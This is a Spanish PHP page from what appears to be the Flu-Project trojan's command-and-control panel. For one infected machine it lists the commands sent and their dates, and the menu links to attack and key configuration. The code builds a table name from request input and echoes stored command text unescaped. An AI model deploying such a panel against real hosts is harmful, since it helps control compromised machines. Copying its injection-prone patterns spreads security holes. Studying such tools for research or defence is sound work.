<?php
session_start();
if(empty($_SESSION['conectado']))
{
   header ("Location: index.php");
   exit;
}
error_reporting(0);
//Se realiza la conexión con la BBDD
//Datos de conexión a la BBBDD
include "conexion-bbdd.php";

function filtrar($variable)
{
	return addcslashes(mysql_real_escape_string($variable),',-<>"');
}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
<!--
@import url("css/style.css");
-->
body {
  background-image: url("images/fondo.png");
  background-color: #000000;
  background-repeat: repeat-x;
}
</style>
</head>
<body>
<br/><div align="center"></a><a href="http://www.flu-project.com"><img src="images/banner-servidor-web-flu.png" border="none"/></a></div><br/>
<div align="center" width="100%"><a href="menuPrincipal.php"><img src="images/boton-menu-principal.png" border="none"/></a>
<a href="configurar-ataque.php"><img src="images/boton-configurar-ataque.png" border="none"/></a>
<a href="configurar-claves.php"><img src="images/claves1.png" border="none"/></a>
<a href="gestionar-usuarios.php"><img src="images/user1.png" border="none"/></a>
<a href="logout.php"><img src="images/logout.png" border="none"/></a>
<?php
error_reporting(0);
$maq=str_replace(array("."),array("_"),filtrar($_GET['maquina']));
$result_a = mysql_query(sprintf("SELECT comando,fecha FROM t_%s",$maq));
if ($row_a = mysql_fetch_array($result_a)){
	echo '<table id="gradient-style" summary="Meeting Results" style="text-align:center;">';
	echo '<thead><tr><th scope="col">Comando</th><th scope="col">Fecha env&iacute;o</th><th scope="col">Ver respuesta</th></tr><thead><tbody>';
	do {
		echo '<tr><td>' . $row_a["comando"] . "</td>";
		echo '<td>'.$row_a["fecha"].'</td>';
		echo '<td><a href="verRespuestaComandoIndividual.php?maquina='.$maq.'&fecha='.$row_a["fecha"].'"><img src="images/eye.png" border="none" /></a></td></tr>';
	} while ($row_a = mysql_fetch_array($result_a));
	echo '</tbody></table></div>';
}
include "cerrar-conexion-bbdd.php";
?>
</body>
</html>